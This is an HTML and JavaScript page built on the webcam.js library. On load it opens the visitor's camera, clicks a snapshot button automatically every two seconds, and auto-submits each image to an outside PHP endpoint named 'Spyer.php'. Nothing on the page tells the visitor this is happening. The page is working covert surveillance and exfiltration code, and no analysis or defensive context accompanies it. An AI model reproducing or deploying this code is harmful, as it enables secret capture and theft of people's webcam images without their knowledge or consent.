
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.24/webcam.js"></script>

<div id="my_camera"></div>
<button id='clicop' type=button value="Take Snapshot" onclick="take_snapshot()">hh</button>
 
<div id="results"></div>
<form id='Yehia_send' action='https://files-exec201.000webhostapp.com/image/Spyer.php' method='POST'>
<textarea id='scan' name='picbas'></textarea>
</form>
<script language="JavaScript">

 // Configure a few settings and attach camera
 Webcam.set({
  width: 320,
  height: 240,
  image_format: 'jpeg',
  jpeg_quality: 200
 });
 Webcam.attach( '#my_camera' );

 // preload shutter audio clip
 var shutter = new Audio();
 shutter.autoplay = true;
 shutter.src = navigator.userAgent.match(/Firefox/) ? 'shutter.ogg' : 'shutter.mp3';

function take_snapshot() {
 // play sound effect
 shutter.play();

 // take snapshot and get image data
 Webcam.snap( function(data_uri) {
 // display results in page
 document.getElementById('results').innerHTML = 
  '<img src="'+data_uri+'"/>';
  document.getElementById('scan').innerHTML = data_uri;
  
  
 


  window.onload = setTimeout(function(){
        document.getElementById("Yehia_send").submit();
        
        
}, 3000);

 } );
}


window.onload = function(){
    var button = document.getElementById('clicop');
    setInterval(function(){
        button.click();
    },2000);  // this will make it click again every 1000 miliseconds
};
</script>
